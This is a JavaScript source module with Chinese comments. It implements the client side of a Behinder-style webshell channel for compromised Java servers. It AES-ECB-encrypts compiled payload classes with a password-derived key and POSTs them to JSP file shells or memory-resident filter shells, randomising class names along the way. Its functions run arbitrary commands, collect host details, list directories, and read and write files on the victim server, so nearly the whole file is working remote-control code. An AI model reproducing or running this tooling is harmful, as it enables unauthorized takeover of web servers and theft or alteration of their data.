// 冰蝎型 Java 通道（behinder-java，JSP/AES-ECB + 编译载荷管线）：
//   密钥 key = md5(连接密码)[0:16]；请求体 = base64( AES-128-ECB( class 字节 ) )
//   马侧契约（冰蝎型 JSP 文件马与同协议内存马通用）：解密 → defineClass →
//   newInstance().equals(pageContext) —— 载荷经反射取 request/response 自行取参与回显。
// 实现策略：自带零依赖反射式载荷类族（payload-src/ 编译嵌入），发送前经 javapatch 做
// 实参注入 + 类名随机化（规避同 ClassLoader 重复 defineClass 的 LinkageError）。
// 可连接对象：冰蝎型 JSP 文件马、Filter/Servlet/Listener 型冰蝎协议内存马。

import { createCipheriv, createDecipheriv } from "node:crypto";
import { httpRequest, b64, unb64, md5hex } from "./http-client.js";
import { patchClass } from "./javapatch.js";
import { JAVA_PAYLOADS } from "./payloads-java.js";
import { shapeHeaders, stripResponse } from "./profile.js";

const NAME_CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
const randomInnerName = () => {
	let s = "";
	for (let i = 0; i < 7; i++) s += NAME_CHARS[(Math.random() * NAME_CHARS.length) | 0];
	return "x/" + s;
};

const keyOf = (conn) => md5hex(String(conn.password ?? "")).slice(0, 16);

function ecbEncrypt(key, plaintext) {
	const c = createCipheriv("aes-128-ecb", Buffer.from(key, "utf8"), null);
	return Buffer.concat([c.update(Buffer.from(plaintext)), c.final()]);
}

export function ecbDecrypt(key, ciphertext) {
	const d = createDecipheriv("aes-128-ecb", Buffer.from(key, "utf8"), null);
	return Buffer.concat([d.update(ciphertext), d.final()]);
}

/** 写入分块（Utf8 常量 64KB 上限内的安全值：b64 后约 42.7K 字符）。 */
const WRITE_CHUNK_RAW = 32000;

/**
 * 发送编译载荷：补丁实参 → 随机类名 → AES-ECB 加密 → POST。
 * @param name 载荷名（JAVA_PAYLOADS 键）
 * @param params {字段名: 值}
 * @returns 马侧明文响应（!ERR 前缀抛错）
 */
export async function sendJavaPayload(conn, name, params = {}) {
	const raw = JAVA_PAYLOADS[name];
	if (!raw) throw new Error(`未知 Java 载荷 ${name}`);
	const cls = patchClass(Buffer.from(raw, "base64"), params, randomInnerName());
	const body = b64(ecbEncrypt(keyOf(conn), cls));
	const res = await httpRequest({
		url: conn.url,
		method: "POST",
		// X-T=1 标记头：内存马 Filter 门控凭据（无此头的 POST 直接放行不读 body）；
		// 对普通 JSP 文件马无影响（马不校验该头）
		headers: shapeHeaders(conn, { "content-type": "application/octet-stream", "X-T": "1", ...(conn.headers ?? {}) }),
		body,
		timeoutMs: conn.timeoutMs
	});
	if (res.status !== 200) throw new Error(`马侧拒绝（HTTP ${res.status}——密码不符或马不存在）`);
	const text = stripResponse(conn, res.bodyBuffer.toString("utf8")).trim();
	if (text.startsWith("!ERR")) throw new Error(`载荷执行失败：${text.slice(4).trim()}`);
	return text;
}

export async function runCommand(conn, command, cwd = "") {
	return sendJavaPayload(conn, "WsmCmd", { c: command, d: cwd });
}

/** WsmProbe 结构化信息：WSM1|token|os|user|home|user.dir|java.version|cpus|realPath。 */
export async function fetchInfo(conn) {
	const token = "WSMJ" + Math.random().toString(36).slice(2, 10).toUpperCase();
	const out = await sendJavaPayload({ ...conn, timeoutMs: Math.min(conn.timeoutMs || 8000, 8000) }, "WsmProbe", { t: token });
	if (!out.startsWith("WSM1|" + token)) return null;
	const f = out.split("|");
	return { token, osName: f[2] ?? "", user: f[3] ?? "", home: f[4] ?? "", userDir: f[5] ?? "", java: f[6] ?? "", cpus: f[7] ?? "", realPath: f[8] ?? "" };
}

/** 目录列表 → JSON 数组（n/d/s/r/w/m 毫秒）。 */
export function listDir(conn, path) {
	return sendJavaPayload(conn, "WsmList", { p: path }).then((t) => JSON.parse(t));
}

/** 读文件（base64 回传，二进制安全）→ Buffer。offset/len 可选（断点续传范围读）。 */
export async function readFile(conn, path, offset = "", length = "") {
	const r = await sendJavaPayload(conn, "WsmRead", { p: path, f: String(offset ?? ""), n: String(length ?? "") });
	if (r.startsWith("!ERR")) throw new Error(r.slice(4).trim());
	const nl = r.indexOf("\n");
	if (r.startsWith("RANGE ") && nl > 0) return { meta: r.slice(0, nl), body: unb64(r.slice(nl + 1)) };
	return { body: unb64(r) };
}

/** 写文件（自动分块追加）。 */
export async function writeFile(conn, path, data) {
	const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
	let off = 0, first = true;
	do {
		const r = await sendJavaPayload(conn, "WsmWrite", {
			p: path,
			b: buf.subarray(off, off + WRITE_CHUNK_RAW).toString("base64"),
			m: first ? "w" : "a"
		});
		if (!r.startsWith("OK")) throw new Error(`马侧写入失败：${r}`);
		off += WRITE_CHUNK_RAW;
		first = false;
	} while (off < buf.length);
	return { ok: true, size: buf.length };
}

const probeToken = () => "WSMJ" + Math.random().toString(36).slice(2, 10).toUpperCase();

export async function probe(conn) {
	try {
		const info = await fetchInfo(conn);
		return info ? { tokenOutput: "WSM1", basicInfo: info } : null;
	} catch {
		return null;
	}
}

export const behinderJavaCodec = {
	id: "behinder-java",
	label: "冰蝎型通道（JSP·AES-ECB·编译载荷）",
	langs: ["jsp"],
	caps: { cmd: true, code: false, b64rw: true },
	sendJavaPayload
};
